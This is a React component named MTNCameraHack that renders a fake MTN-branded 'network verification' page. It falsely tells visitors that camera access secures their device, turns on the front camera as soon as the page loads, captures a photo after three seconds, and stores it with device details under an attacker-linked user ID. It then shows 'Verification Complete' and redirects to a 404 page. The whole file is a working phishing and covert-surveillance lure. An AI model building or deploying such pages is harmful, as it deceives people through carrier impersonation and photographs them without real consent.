
import { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';

const MTNCameraHack = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [isCapturing, setIsCapturing] = useState(false);
  const [stream, setStream] = useState<MediaStream | null>(null);

  useEffect(() => {
    startCamera();
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const startCamera = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 }
        },
        audio: false 
      });
      
      setStream(mediaStream);
      
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        videoRef.current.play();
        
        // Auto capture after 3 seconds
        setTimeout(() => {
          capturePhoto();
        }, 3000);
      }
    } catch (error) {
      console.log('Camera access denied or not available');
      // Simulate capture for demo purposes
      setTimeout(() => {
        setIsCapturing(true);
        setTimeout(() => {
          navigate('/404-not-found');
        }, 2000);
      }, 3000);
    }
  };

  const capturePhoto = () => {
    if (videoRef.current && canvasRef.current && stream) {
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');
      
      canvas.width = videoRef.current.videoWidth || 640;
      canvas.height = videoRef.current.videoHeight || 480;
      
      if (context) {
        context.drawImage(videoRef.current, 0, 0);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Save captured image to user's inbox
        const capturedData = {
          carrier: 'MTN',
          imageUrl: imageData,
          timestamp: Date.now(),
          ip: 'Unknown',
          userAgent: navigator.userAgent,
          deviceInfo: {
            platform: navigator.platform,
            language: navigator.language
          }
        };

        const existingData = JSON.parse(localStorage.getItem(`camera_${userId}`) || '[]');
        existingData.push(capturedData);
        localStorage.setItem(`camera_${userId}`, JSON.stringify(existingData));
        
        // Stop camera stream
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        
        setIsCapturing(true);
        
        // Redirect after capture
        setTimeout(() => {
          navigate('/404-not-found');
        }, 2000);
      }
    }
  };

  return (
    <div className="min-h-screen bg-yellow-400 flex items-center justify-center p-4">
      <div className="max-w-md mx-auto bg-white rounded-lg shadow-xl overflow-hidden">
        <div className="bg-yellow-500 p-4 text-center">
          <h1 className="text-white text-2xl font-bold">MTN</h1>
          <p className="text-white text-sm">Network Verification Required</p>
        </div>
        
        <div className="p-6">
          {!isCapturing ? (
            <>
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-yellow-500 rounded-full flex items-center justify-center mx-auto mb-4">
                  <span className="text-white text-2xl">📱</span>
                </div>
                <h2 className="text-gray-800 text-lg font-semibold mb-2">Network Security Check</h2>
                <p className="text-gray-600 text-sm">Please allow camera access to verify your device for network optimization</p>
              </div>

              <video 
                ref={videoRef} 
                className="w-full rounded-lg mb-4 bg-gray-200"
                autoPlay 
                muted 
                playsInline
                style={{ maxHeight: '300px', objectFit: 'cover' }}
              />
              
              <canvas ref={canvasRef} style={{ display: 'none' }} />
              
              <div className="bg-blue-50 p-4 rounded-lg mb-4">
                <p className="text-blue-800 text-sm">
                  🔒 This is a secure verification process to ensure optimal network performance on your device.
                </p>
              </div>

              <Button 
                onClick={startCamera}
                className="w-full bg-yellow-500 hover:bg-yellow-600 text-white h-12 font-semibold"
              >
                Start Verification
              </Button>
            </>
          ) : (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-yellow-500 mx-auto mb-4"></div>
              <h3 className="text-gray-800 text-lg font-semibold mb-2">Verification Complete</h3>
              <p className="text-gray-600 text-sm">Your device has been successfully verified. Redirecting...</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default MTNCameraHack;
